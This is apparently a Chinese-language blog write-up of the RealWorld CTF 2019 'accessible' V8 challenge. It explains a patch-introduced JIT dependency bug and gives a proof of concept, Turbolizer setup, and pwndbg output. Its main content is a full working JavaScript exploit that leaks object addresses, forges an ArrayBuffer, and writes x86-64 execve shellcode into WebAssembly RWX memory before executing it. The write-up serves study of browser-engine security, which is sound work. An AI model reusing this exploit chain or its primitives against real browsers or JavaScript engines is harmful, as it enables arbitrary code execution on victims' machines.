+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.c = &#123;<span class="attr">a</span>: <span class="number">1.1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leaker</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> o.c.a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++) &#123;</span><br><span class="line">    leaker(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf_to_leak = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">obj.c = &#123;<span class="attr">b</span>: buf_to_leak&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(leaker(obj))</span><br></pre></td></tr></table></figure>
+<p>由于在Patch中删除了<font color="#D00000">details_representation.IsHeapObject()</font>时的<font color="#D00000">unrecorded_dependencies.push_back</font>，HeapObject不会被添加到dependencies。<br>POC中，首先字典传入obj，然后多次调用leaker(返回o.c.a)使得生成JIT代码，然后替换掉原来的字典。这时候并没有触发deoptimize，而是把buf_to_leak地址打印了出来。</p>
+<pre><code>在POC中如果在替换字典时出现了同属性名，{a: buf_to_leak}，则会触发deoptimize。
+因为在原始对象的映射上仍然有一个单独的代码依赖项。
+通过创建具有相同属性名称的新对象，它将使用转换来查找相同的映射，然后对其执行类型泛化。这种泛化使代码段无效。
+</code></pre><h2 id="Turbolizer搭建"><a href="#Turbolizer搭建" class="headerlink" title="Turbolizer搭建"></a>Turbolizer搭建</h2><p>我们通过Turbolizer可视化来验证该POC。<br>安装最新版nodejs。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install curl python-software-properties</span><br><span class="line">curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -</span><br><span class="line">sudo apt-get install nodejs</span><br></pre></td></tr></table></figure></p>
+<p>安装并启动Turbolizer<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8/tools/turbolizer</span><br><span class="line">npm i</span><br><span class="line">npm run-script build</span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure></p>
+<p>生成可视化文件<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./out.gn/x64.debug/d8 --trace-turbo ~/browser/poc/RealWorld_CTF2019_accessible/poc.js --trace-turbo-path ~/browser/turbo/</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/05/04/RealWorld-CTF2019-accessible/001.png" alt="001"><br>可以看到在TyperLowering阶段存在两次CheckMaps，分别为obj以及obj.c<br><img src="/2020/05/04/RealWorld-CTF2019-accessible/002.png" alt="002"><br>在SimplifiedLowering阶段只有对obj的CheckMaps，obj.c以及转为添加dependency的方法。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="任意对象读取"><a href="#任意对象读取" class="headerlink" title="任意对象读取"></a>任意对象读取</h3><p>在POC中基本完成。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;<span class="attr">c</span>: &#123;<span class="attr">x</span>: <span class="number">1.1</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leaker</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> o.c.x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x5000</span>; i++)&#123;</span><br><span class="line">    leaker(obj1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_obj</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    obj1.c = &#123;<span class="attr">y</span>: o&#125;;</span><br><span class="line">    res = tC.f2u(leaker(obj1))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="伪造ArrayBuffer"><a href="#伪造ArrayBuffer" class="headerlink" title="伪造ArrayBuffer"></a>伪造ArrayBuffer</h3><p>JSArray布局图如下</p>
+<pre><code>Elements---&gt;+-------------+
+            |  MAP        +&lt;------+
+            +-------------+       |
+            |  Length     |       |
+            +-------------+       |
+            |  element#1  |       |
+            +-------------+       |
+            |  element#2  |       |
+            +-------------+       |
+            |     ...     |       |
+            +-------------+       |
+            |  element#N  |       |
+ JSArray---&gt;--------------+       |
+            |  MAP        |       |
+            +-------------+       |
+            |  Properties |       |
+            +-------------+       |
+            |  Elements   +-------+
+            +-------------+
+            |  Length     |
+            +-------------+
+            |     ...     |
+            +-------------+
+</code></pre><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_arraybuffer = [</span><br><span class="line">	<span class="comment">//map|properties</span></span><br><span class="line">    tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//elements|length</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x1000</span>),</span><br><span class="line">	<span class="comment">//backingstore|0x2</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x2</span>),</span><br><span class="line">	<span class="comment">//padding</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//fake map</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x1900042317080808</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x00000000084003ff</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>)</span><br><span class="line">].slice(<span class="number">0</span>); <span class="comment">//0x80</span></span><br></pre></td></tr></table></figure>
+<p>slice或者splice使得Elements紧邻JSArray。fake_map中只要部分需要特定值(通过调试获取一个真实的map的值)，其余填写0就行。</p>
+<h3 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h3><p>调试以下代码。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> wasmFunc = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(wasmInstance);</span><br><span class="line">readline();</span><br></pre></td></tr></table></figure></p>
+<pre><code>pwndbg&gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+ 0x7c8e4c41000      0x7c8e4c80000 ---p    3f000 0      
+ 0x7c8e4c80000      0x7c8e4c81000 rw-p     1000 0      
+ 0x7c8e4c81000      0x7c8e4c82000 ---p     1000 0      
+ 0x7c8e4c82000      0x7c8e4ca8000 r-xp    26000 0      
+ 0x7c8e4ca8000      0x7c8e4cbf000 ---p    17000 0      
+ 0x7c8e4cbf000      0x7c8e4cc0000 ---p     1000 0      
+ 0x7c8e4cc0000      0x7c8e4cc1000 rw-p     1000 0      
+ 0x7c8e4cc1000      0x7c8e4cc2000 ---p     1000 0      
+ 0x7c8e4cc2000      0x7c8e4cff000 r-xp    3d000 0      
+ 0x7c8e4cff000      0x7c8ecc41000 ---p  7f42000 0      
+ 0x8dcdd0c0000      0x8dcdd100000 rw-p    40000 0      
+ 0xe0e6e880000      0xe0e6e8c0000 rw-p    40000 0      
+ 0x11bb1ee02000     0x11bb1ee03000 rwxp    1000 0   
+--------------------------------------------------
+pwndbg&gt; search -8 0x11bb1ee02000
+            0xe0e6e89fe98 0x11bb1ee02000
+--------------------------------------------------
+pwndbg&gt; p/x 0xe0e6e89fe98 - 0xe0e6e89fe18
+$1 = 0x80
+</code></pre><p>可以看到存储RWX地址的地址为wasmInstance_addr + 0x80。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span>(<span class="params">str, val</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+]"</span> + str + hex(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2u(val)&#123;        <span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    u2f(val)&#123;        <span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tC = <span class="keyword">new</span> typeConvert();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> wasmFunc = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;<span class="attr">c</span>: &#123;<span class="attr">x</span>: <span class="number">1.1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;<span class="attr">d</span>: &#123;<span class="attr">w</span>: ab&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arraybuffer = [</span><br><span class="line">	<span class="comment">//map|properties</span></span><br><span class="line">    tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//elements|length</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x1000</span>),</span><br><span class="line">	<span class="comment">//backingstore|0x2</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x2</span>),</span><br><span class="line">	<span class="comment">//padding</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//fake map</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x1900042317080808</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x00000000084003ff</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>)</span><br><span class="line">].slice(<span class="number">0</span>);<span class="comment">//伪造ArrayBuffer</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leaker</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> o.c.x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">faker</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> o.d.w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对obj1和obj2进行编译</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x5000</span>; i++)&#123;</span><br><span class="line">    leaker(obj1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x5000</span>; i++)&#123;</span><br><span class="line">    faker(obj2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_obj</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    obj1.c = &#123;<span class="attr">y</span>: o&#125;;</span><br><span class="line">    res = tC.f2u(leaker(obj1))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fake_arraybuffer_addr = leak_obj(fake_arraybuffer) - <span class="number">0x80</span>;</span><br><span class="line">wasmInstance_addr = leak_obj(wasmInstance) - <span class="number">0x1</span>;</span><br><span class="line">success(<span class="string">"fake_arraybuffer_addr -&gt; "</span>,fake_arraybuffer_addr);</span><br><span class="line">success(<span class="string">"wasmInstance_addr -&gt; "</span>,wasmInstance_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_map_addr = fake_arraybuffer_addr + <span class="number">0x40</span>;</span><br><span class="line">RWX_addr_loc = wasmInstance_addr + <span class="number">0x80</span>;</span><br><span class="line"></span><br><span class="line">fake_arraybuffer[<span class="number">0</span>] = tC.u2f(fake_map_addr);<span class="comment">//伪造map</span></span><br><span class="line">fake_arraybuffer[<span class="number">4</span>] = tC.u2f(RWX_addr_loc);<span class="comment">//改写backingstore</span></span><br><span class="line">obj2.d = &#123;<span class="attr">z</span>: tC.u2f(fake_arraybuffer_addr)&#125;;</span><br><span class="line">real_ab = faker(obj2);</span><br><span class="line">fake_obj = <span class="keyword">new</span> <span class="built_in">DataView</span>(real_ab);<span class="comment">//将伪造的ArrayBuffer取出</span></span><br><span class="line">RWX_addr = tC.f2u(fake_obj.getFloat64(<span class="number">0</span>, <span class="literal">true</span>));<span class="comment">//读取backingstore指向的内容</span></span><br><span class="line">success(<span class="string">"RWX_addr -&gt; "</span>,RWX_addr)</span><br><span class="line">fake_arraybuffer[<span class="number">4</span>] = tC.u2f(RWX_addr);<span class="comment">//把backingstore改为RWX区域</span></span><br><span class="line"></span><br><span class="line">shellcode = [<span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3a</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>];</span><br><span class="line"><span class="comment">//写入shellcode</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">    fake_obj.setUint8(i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">wasmFunc();<span class="comment">//执行shellcode</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/04/RealWorld-CTF2019-accessible/003.png" alt="003"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/6507" target="_blank" rel="noopener">v8 exploit - RealWorld CTF2019 accessible</a><br><a href="https://mem2019.github.io/jekyll/update/2019/09/16/Real-World-2019-Accessible.html" target="_blank" rel="noopener">Real World CTF 2019 Accessible Write-up</a><br><a href="https://blog.fundebug.com/2019/07/16/how-does-v8-work/" target="_blank" rel="noopener">JavaScript深入浅出第4课：V8引擎是如何工作的？</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/exploit/" rel="tag"># exploit</a>
+          
+            <a href="/tags/Browser/" rel="tag"># Browser</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/26/CTF2019-OOB-v8/" rel="next" title="*CTF2019 OOB-v8">
+                <i class="fa fa-chevron-left"></i> *CTF2019 OOB-v8
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
